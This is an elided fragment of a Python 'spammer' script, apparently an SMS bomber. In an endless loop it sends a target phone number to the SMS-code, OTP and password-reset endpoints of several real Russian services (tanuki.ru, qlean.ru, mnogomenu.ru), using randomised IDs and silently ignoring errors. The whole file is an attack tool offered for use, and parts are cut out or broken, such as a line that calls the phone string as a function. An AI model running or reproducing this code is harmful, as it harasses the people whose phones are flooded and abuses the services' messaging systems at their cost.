...
def banner():
    ...
    print(f"\033[1m\033[32m  ___ ___  _   __  __ __  __ ___ ___  ")
    print(f"\033[1m\033[32m / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
    print(f"\033[1m\033[32m \__ \  _/ _ \| |\/| | |\/| | _||   / ")
    print(f"\033[1m\033[32m |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
    print('')
    print(f"\033[1m\033[32m     Spammer: github.com/cludeex\n\033[0m")
...
def start_spam(phone):
    def format_phone(phone, maska):
        if len(phone) == maska.count('#'):
    ...
    while True:
        ...
        try:
            formatted_phone = format_phone(phone, "(+#)##########")
            requests.post("https://www.tanuki.ru/api/", json={"header": {"version": "2.0", "userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}", "agent": {"device": "desktop", "version": "undefined undefined"}, "langId": "1", "cityId": "9", }, "method": {"name": "sendSmsCode"}, "data": {"phone": formatted_phone, "type": 1}})
        except:
            pass
        try:
        ...
        try:
            ...
            pass
        try:
            requests.get("https://sso.cloud.qlean.ru/http/users/requestotp", headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": phone, "clientId": "undefined", "sessionId": phone(randint(5000, 9999))})
        except:
            pass
        try:
        ...
        try:
            formatted_phone = format_phone(phone, "+# (###) ### ## ##")
            requests.get(f"http://mnogomenu.ru/office/password/reset/"+formatted_phone)
        except:
            pass
        try:
